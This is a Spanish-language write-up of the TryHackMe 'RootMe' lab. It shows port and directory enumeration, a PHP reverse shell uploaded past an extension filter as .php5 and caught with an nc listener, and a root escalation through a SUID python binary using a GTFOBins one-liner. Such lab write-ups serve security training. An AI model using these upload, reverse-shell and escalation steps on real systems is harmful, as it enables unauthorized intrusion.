---
title: TryHackMe RootMe Writeup
published: true
---

La máquina RootMe, es una máquina de TryHackMe en la que mediante la explotación de un servidor web conseguimos responder a las preguntas que nos plantean:

* ¿Cuántos puertos están abiertos?<br>
    *
* ¿Qué versión de Apache está corriendo?<br>
    2.*.**
* ¿Qué servicio corre en el puerto 22?<br>
    S**
* Mediante alguna herramienrta de numeración encuentra directorios. ¿Cuál es el directorio oculto?<br>
    /p????/
* user.txt <br>
    THM{y?????????l}
* Busca archivos que tengan permisos SUID. De ellos, ¿cuál es el archivo raro?<br>                 /u??/???/?????
* Encuentra una forma de escalar privilegios para encontrar root.txt <br>
    THM{p???????_?????????n}


# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar los puertos abiertos:

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
❯ nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.252.141 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-12 07:11 EDT
Initiating Ping Scan at 07:11
Scanning 10.10.252.141 [2 ports]
Completed Ping Scan at 07:11, 0.04s elapsed (1 total hosts)
Initiating Connect Scan at 07:11
Scanning 10.10.252.141 [65535 ports]
Discovered open port 22/tcp on 10.10.252.141
Discovered open port 80/tcp on 10.10.252.141
Completed Connect Scan at 07:11, 11.78s elapsed (65535 total ports)
Nmap scan report for 10.10.252.141
Host is up, received syn-ack (0.049s latency).
Scanned at 2022-10-12 07:11:31 EDT for 12s
Not shown: 65146 closed tcp ports (conn-refused), 387 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.88 seconds 
```

El escaneo nos reporta dos puertos abiertos, el 22 y el 80, así como el servicio que corre en cada uno de ellos.

Conseguimos así la primera pregunta, 2 puertos abiertos

Como nos piden la version de Apache podemos hacer whatweb para ver lo que nos reporta: 

```bash
❯ whatweb 10.10.252.141
http://10.10.252.141 [200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.252.141], Script, Title[HackIT - Home]
```

Vemos que es la versión 2.4.29 y conseguimos la segunda pregunta.

El servicio del puerto 22 ya nos lo reporta el esacaneo anterior pero para obtener un poco más de información podemos hacer: 

```bash
❯ nmap -sCV -p22,80 10.10.252.141 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-12 07:16 EDT
Nmap scan report for 10.10.252.141
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
[1]    10554 segmentation fault  nmap -sCV -p22,80 10.10.252.141 -oN targeted
```
Debido a que el puerto 80 está abierto, nos metemos en la dirección $IP-VICTIMA y vemos un texto que dice: **Can you root me?** 

A continuación pasamos a la siguiente pregunta en la que tenemos que encontrar el directorio oculto. Para ello mediante la herramineta gobuster hacemos:

```bash
> gobuster dir -u http://10.10.252.141/ -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.252.141/
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
2022/10/12 07:20:07 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.hta.php             (Status: 403) [Size: 278]
/.hta.html            (Status: 403) [Size: 278]
/.hta.txt             (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.10.252.141/css/]
/index.php            (Status: 200) [Size: 616]                                
/index.php            (Status: 200) [Size: 616]                                
/js                   (Status: 301) [Size: 311] [--> http://10.10.252.141/js/] 
/p????                (Status: 301) [Size: 314] [--> http://10.10.252.141/p????/]
/server-status        (Status: 403) [Size: 278]                                  
/uploads              (Status: 301) [Size: 316] [--> http://10.10.252.141/uploads/]
                                                                                   
===============================================================
2022/10/12 07:20:45 Finished
===============================================================
```

Buscamos los directorios de la $IP-VICTIMA usando el archivo de lista de palabras directory-list1.0.txt

En este punto podríamos usar cualquier lista de palabras.

Encontramos el directorio oculto que sabemos que empieza por /p????

Nos metemos en el directorio oculto desde el navegador y parece que podemos subir archivos, probaremos entonces a conseguir una reverse shell mediante este método.

# []($header-1)File Upload Vulnerability (Direct File upload)

Primero comprobaremos que se pueden subir imagenes correctamente. Para ello, tras subirla en /p???? nos dirigimos al directorio /uploads que hemos reconocido en el paso anterior con gobuster.

La imagen aparece en el panel de /uploads por lo que si que nos deja. El siguiente paso será descargarnos una php reverse shell. En mi caso lo he hecho desde <a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell"> Pentest Monkey </a>

Una vez descargada modificamos el archivo .php, tanto el puerto, por ejemplo el 4444 como el valor $ip. **¡Debe ser tu IP!**

```php
set_time_limit (0);
$VERSION = "1.0";
$ip = '$MY-IP';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```
Desde la máquina atcante nos ponemos en escucha por el puerto 4444 con nc:

```bash
❯ nc -lnvp 4444
listening on [any] 4444 ...
```

Agregamos nuestra reverse shell con extension .php5 (porque con php no nos deja) y le damos a upload.

Nos dice que todo ha ido correcto y nos metemos en el panel de /uploads. Ahí se encunetra el archivo .php5

Lo ejecutamos estando en escucha y...

```bash
❯ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.8.79.39] from (UNKNOWN) [10.10.252.141] 55654
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 11:55:39 up  1:09,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

Conseguimos acceso a la máquina víctima


# []($header-1)Enumareación interna y escalada de privilegios

Buscamos un archivo en el sistema que se llame user.txt y lo abrimos

```bash
$ find / -type f -name user.txt 2>/dev/null
/var/www/user.txt
$ cat /var/www/user.txt
THM{???_???_?_?????}
```
Para buscar archivos con permisos SUID podemos hacer:

```bash
$ find / type -f -user root -perm -u=s 2> /dev/null
```
Encontramos así la respuesta a la siguiente pregunta:

```vash
/usr/bin/python
```

Sabiendo que tenemos permisos, para escalar privilegios podemos usar uno de los métodos de <a href="https://gtfobins.github.io/gtfobins/python/#suid"> GTFOBins</a>

```bash
$ ./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
# cat /root/root.txt
THM{????????}
```

Muchas gracias por leer este writeup, espero que te haya gustado!
